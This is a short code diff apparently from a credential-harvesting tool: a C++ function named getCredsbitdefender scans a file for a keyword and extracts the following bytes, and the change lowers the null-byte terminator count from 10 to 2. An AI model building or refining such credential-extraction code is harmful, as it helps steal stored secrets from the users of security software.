@@ -23,7 +23,7 @@ int getCredsbitdefender() {
         if (c == searchKeyword[foundData.size()]) {
             foundData += c;
             if (foundData == searchKeyword) {
-                // We found the search keyword, now collect data until 10 binary spaces (00) are found
+                // We found the search keyword, now collect data until 2 binary spaces (00) are found
                 std::vector<unsigned char> extractedData;
                 int consecutiveSpaces = 0;
 
@@ -31,8 +31,8 @@ int getCredsbitdefender() {
                     file.read(reinterpret_cast<char*>(&c), sizeof(c));
                     if (c == 0x00) {
                         consecutiveSpaces++;
-                        if (consecutiveSpaces == 10) {
-                            break; // 10 consecutive binary spaces found
+                        if (consecutiveSpaces == 2) {
+                            break; // 2 consecutive binary spaces found
                             // We can check for more spaces if we want
                         }
                     }
